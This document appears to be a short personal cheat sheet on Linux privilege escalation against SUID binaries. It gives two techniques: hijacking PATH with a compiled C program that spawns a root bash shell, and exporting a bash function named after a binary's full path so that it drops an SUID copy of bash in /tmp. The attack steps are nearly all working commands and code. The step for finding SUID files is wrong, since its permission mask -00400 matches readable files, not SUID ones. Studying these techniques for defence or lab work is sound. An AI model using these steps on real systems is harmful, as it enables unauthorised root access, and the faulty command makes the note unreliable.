---
aliases:
  - Lunux Privilege Escalation via Environment Variables
tags:
  - tech
  - cybsec
  - linux
  - privilege_escalation
  - privesc
  - suid
  - set_user_id
  - environment_variables
author: Mehdi N Tehrani
creat_date: 2023-12-17
category: Cyber Security
subcategory: Linux Security
---
# Use a file to exploit
## 1. find files with suid set
`find / -type f -perm -00400`
## 2. find out if an executable is being called
using process logs, `strings` or ghidra, etc.
## 3. make a malicious executable 
```c
int main() {
   setuid(0);
   setgid(0);
   system("/bin/bash");
   return 0; 
}
```
and compile it to the name of the executable found in step 2
`gcc -o executable_name in.c`
put it in a path which have access to like `/tmp`
## 4. add dir path to PATH env var
`export PATH=/dirpath/to/c:$PATH`
e.g.
`export PATH=/tmp:$PATH`

## 5. run the executable
this will run a bash shell with root permissions

# Use a function to exploit
Try step 1 and 2 from previous section
```sh
# make a function whose name is the same as a path to an executable with suid set
$ function /path/to/file() { cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p; }
$ export -f /path/to/file    # i.e. function name
#         ^ function
# then run the parent file which calls the child file for which we just made a function; note that the function name is the same as the child file's full path 
```





